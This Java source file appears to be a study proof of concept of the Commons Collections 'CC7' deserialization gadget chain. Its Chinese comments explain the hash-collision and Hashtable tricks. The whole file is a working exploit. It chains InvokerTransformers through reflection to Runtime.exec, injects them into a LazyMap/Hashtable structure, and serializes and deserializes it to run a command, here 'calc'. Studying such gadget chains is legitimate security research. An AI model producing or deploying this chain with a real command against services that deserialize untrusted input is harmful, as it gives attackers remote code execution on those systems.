import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.AbstractMapDecorator;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.AbstractMap;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**

 */
public class CC7 {
    public static void main(String[] args) throws Exception {

//        hashcode相同3872
//        int b = "yy".hashCode();
//        int a = "zZ".hashCode();

        Transformer[] transformers = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        //      链式+Constant
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

        HashMap<Object, Object> map1 = new HashMap<>();
        HashMap<Object, Object> map2 = new HashMap<>();
        Map<Object, Object> lazy1 = LazyMap.decorate(map1, chainedTransformer);
        Map<Object, Object> lazy2 = LazyMap.decorate(map2, chainedTransformer);
//        yy和zZ的hashCode值一样，解决了hash碰撞问题
        lazy1.put("yy",1);
        lazy2.put("zZ",1);

//        为了进入for循环，进而进入equals
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazy1,1);
        hashtable.put(lazy2,2);


        Class<? extends ChainedTransformer> c = chainedTransformer.getClass();
        Field iTransformers = c.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,transformers);

//        解决反序列化时比较size逻辑
        lazy2.remove("yy");

        serialize(hashtable);
        unSerialize("ser.bin");



    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unSerialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
